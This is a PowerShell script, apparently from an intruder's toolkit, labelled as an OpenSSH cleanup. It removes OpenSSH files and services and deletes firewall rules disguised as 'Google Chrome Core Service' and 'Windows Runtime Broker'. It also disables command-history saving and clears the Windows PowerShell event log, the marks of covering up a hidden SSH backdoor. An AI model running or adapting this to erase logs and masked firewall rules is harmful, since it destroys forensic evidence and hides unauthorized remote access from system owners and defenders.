<# Script to cleanup openssh both zip and exe installs.#>
# variables
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$nugetProvider = Get-PackageProvider -ListAvailable -Name NuGet
$packagename = "OpenSSH"
$sshdirtorm = @("C:\ProgramData\ssh", "C:\Program Files\OpenSSH")
$serviceNames = @("sshd", "ssh-agent")
$fwruleset = ("Google Chrome Core Service", "Windows Runtime Broker")

# package cleanup.
$nugetProvider = Get-PackageProvider -ListAvailable -Name NuGet
if (-not $nugetProvider) {
    Install-PackageProvider -Name NuGet -Force | Out-Null
}
Uninstall-Package $packagename -Force -Confirm:$false

# directory cleanup
foreach ($directory in $sshdirtorm) {
    if (Test-Path $directory) {
        Remove-Item -Path $directory -Recurse -Force -Confirm:$false 
	}
}

# service deletion.
foreach ($serviceName in $serviceNames) {
    if (Get-Service -Name $serviceName ) {
        # Stop the service if it's running
        if (Get-Service -Name $serviceName | Where-Object { $_.Status -eq 'Running' }) {
            Stop-Service -Name $serviceName -Force
        }
        sc.exe delete $serviceName | Out-Null
    }
}

# firewall cleanup.
foreach ($ruleName in $fwruleset) {
    try {
        $existingRule = Get-NetFirewallRule -DisplayName $ruleName -ErrorAction Stop
        if ($existingRule) {
            Remove-NetFirewallRule -DisplayName $ruleName
        }
    }
    catch {
    }
}